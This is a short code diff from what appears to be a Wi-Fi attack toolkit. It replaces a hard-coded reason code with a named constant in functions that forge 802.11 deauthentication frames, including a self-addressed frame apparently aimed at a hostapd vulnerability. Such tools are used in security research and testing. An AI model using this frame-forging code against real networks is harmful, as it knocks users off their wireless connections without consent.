@@ -4,6 +4,7 @@
 
 #include "attacks/DoS_soft/deauth/deauth.h"
 #include "attacks/components/setup_connections.h"
+#include "net_parser/dot11_defs.h"
 #include "ex_program/hostapd/hostapd_helper.h"
 #include "interrupt.h"
 #include "logger/log_util.h"
@@ -26,7 +27,7 @@ using namespace chrono;
 RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 	Dot11Deauthentication frame(sta_mac, ap_mac);
 	frame.addr3(ap_mac);  // BSSID
-	frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
+	frame.reason_code(dot11::REASON_CLASS3_FRAME_NONASSOC); // required by sme_event_unprot_disconnect
 	RadioTap rt{};
 	rt.inner_pdu(frame);
 	return rt;
@@ -44,7 +45,7 @@ RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 RadioTap make_cve_deauth(const HWAddress<6> &ap_mac) {
 	Dot11Deauthentication frame(ap_mac, ap_mac); // DA=AP, SA=AP (self-addressed)
 	frame.addr3(ap_mac);
-	frame.reason_code(7);
+	frame.reason_code(dot11::REASON_CLASS3_FRAME_NONASSOC);
 	RadioTap rt{};
 	rt.inner_pdu(frame);
 	return rt;
